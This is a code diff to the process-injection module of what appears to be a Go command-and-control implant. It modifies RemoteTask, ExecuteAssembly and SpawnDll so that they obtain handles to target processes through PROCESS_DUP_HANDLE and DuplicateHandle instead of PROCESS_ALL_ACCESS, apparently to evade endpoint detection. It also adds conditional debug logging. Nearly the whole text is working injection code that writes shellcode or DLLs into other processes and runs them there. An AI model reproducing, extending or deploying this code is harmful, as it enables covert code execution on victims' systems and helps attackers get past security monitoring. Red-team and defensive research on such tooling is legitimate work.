@@ -44,11 +44,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-const (
-	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
-	STILL_ACTIVE       = 259
-)
-
 var (
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
@@ -139,15 +134,30 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
+	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
 		return err
 	}
-	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
+	processHandle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, false, uint32(processID))
 	if processHandle == 0 {
 		return err
 	}
-	_, err = injectTask(processHandle, data, rwxPages)
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return err
+	}
+	err = windows.DuplicateHandle(processHandle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return err
+	}
+	_, err = injectTask(lpTargetHandle, data, rwxPages)
 	if err != nil {
 		return err
 	}
@@ -192,7 +202,10 @@ func LocalTask(data []byte, rwxPages bool) error {
 }
 
 func ExecuteAssembly(data []byte, process string) (string, error) {
-	var stdoutBuf, stderrBuf bytes.Buffer
+	var (
+		stdoutBuf, stderrBuf bytes.Buffer
+		lpTargetHandle       windows.Handle
+	)
 	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Config.Debug}}
@@ -204,11 +217,27 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
-	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
-	threadHandle, err := injectTask(handle, data, false)
+	defer windows.CloseHandle(handle)
+	defer windows.CloseHandle(lpTargetHandle)
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return "", err
+	}
+	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return "", err
+	}
+	threadHandle, err := injectTask(lpTargetHandle, data, false)
 	if err != nil {
 		return "", err
 	}
@@ -226,6 +255,7 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 }
 
 func SpawnDll(procName string, data []byte, offset uint32, args string, kill bool) (string, error) {
+	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
 		return "", err
@@ -241,19 +271,34 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", procName, pid)
 	// {{end}}
-	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return "", err
+	}
+	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return "", err
+	}
 	defer windows.CloseHandle(handle)
-	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
+	defer windows.CloseHandle(lpTargetHandle)
+	dataAddr, err := allocAndWrite(data, lpTargetHandle, uint32(len(data)))
 	argAddr := uintptr(0)
 	if len(args) > 0 {
 		//{{if .Config.Debug}}
 		log.Printf("Args: %s\n", args)
 		//{{end}}
 		argsArray := []byte(args)
-		argAddr, err = allocAndWrite(argsArray, handle, uint32(len(argsArray)))
+		argAddr, err = allocAndWrite(argsArray, lpTargetHandle, uint32(len(argsArray)))
 		if err != nil {
 			return "", err
 		}
@@ -262,7 +307,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
 	//{{end}}
 	startAddr := uintptr(dataAddr) + uintptr(offset)
-	threadHandle, err := protectAndExec(handle, dataAddr, startAddr, argAddr, uint32(len(data)))
+	threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, argAddr, uint32(len(data)))
 	if err != nil {
 		return "", err
 	}
@@ -275,6 +320,9 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 		if err != nil {
 			return "", err
 		}
+		// {{if .Config.Debug}}
+		log.Printf("[*] Thread completed execution, attempting to kill remote process\n")
+		// {{end}}
 		cmd.Process.Kill()
 		return stdoutBuff.String() + stderrBuff.String(), nil
 	}
@@ -346,7 +394,10 @@ func waitForCompletion(threadHandle windows.Handle) error {
 			// {{end}}
 			return err
 		}
-		if code == STILL_ACTIVE {
+		// {{if .Config.Debug}}
+		log.Printf("[!] Error: %v, code: %d\n", err, code)
+		// {{end}}
+		if code == syscalls.STILL_ACTIVE {
 			time.Sleep(time.Second)
 		} else {
 			break
